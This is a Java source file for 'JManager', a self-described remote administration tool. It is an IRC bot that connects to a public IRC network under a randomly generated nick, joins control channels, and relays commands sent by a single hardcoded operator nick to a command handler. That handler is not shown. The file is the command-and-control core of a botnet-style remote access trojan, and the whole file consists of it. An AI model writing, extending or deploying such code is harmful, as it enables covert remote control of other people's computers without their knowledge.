package com.jmanager;

import java.io.IOException;
import java.util.Random;

import org.jibble.pircbot.IrcException;
import org.jibble.pircbot.NickAlreadyInUseException;
import org.jibble.pircbot.PircBot;

import com.jmanager.command.CommandHandler;

/**
 * An Open-Source Java Remote Administration Tool.
 * 
 * @author Desmond Jackson
 */
public class JManager extends PircBot {

	/**
	 * The manager of this IRC bot.
	 */
	private String manager;

	/**
	 * The last channel in which a command was received.
	 */
	private String channel;
	
	/**
	 * The command handler of this manager.
	 */
	private CommandHandler commandHandler;

	/**
	 * Creates a new IRC bot.
	 * 
	 * @param manager The manager of this IRC bot
	 * 
	 * @param mainChannel The IRC channel for this IRC bot to join 
	 * 
	 * @throws IrcException 
	 * 
	 * @throws IOException 
	 * 
	 * @throws NickAlreadyInUseException 
	 */
	public JManager(String manager, String mainChannel)
			throws NickAlreadyInUseException, IOException, IrcException {
		super();
		this.manager = manager;
		this.commandHandler = new CommandHandler(this);
		setVerbose(true);
		setName("user" + new Random().nextInt());
		connect("irc.rizon.net");
		joinChannel("#".concat(mainChannel));
		joinChannel("#".concat(getName()));
	}

	/**
	 * The main method.
	 * 
	 * @param args Any string arguments passed to this program
	 */
	public static void main(String[] args) {
		try {
			new JManager("dmoneigh", "jmanager");
		} catch (NickAlreadyInUseException e) {
			main(args);
		} catch (IOException e) {
			e.printStackTrace();
		} catch (IrcException e) {
			e.printStackTrace();
		}
	}
	
	/**
	 * Replies to a received command.
	 * 
	 * @param message The contents of the reply
	 */
	public void reply(String message) {
		sendMessage(channel, message);
	}
	
	@Override
	public void onMessage(String channel, String sender, String login,
			String hostname, String message) {
		String colons = "::";
		if (sender.equalsIgnoreCase(manager) && message.contains(colons)) {
			this.channel = channel;
			String name = message.split(colons)[0];
			String[] arguments = message.substring(message.indexOf(colons))
					.replace(colons, "").split(" ");
			commandHandler.handle(name, arguments);
		}
	}

}
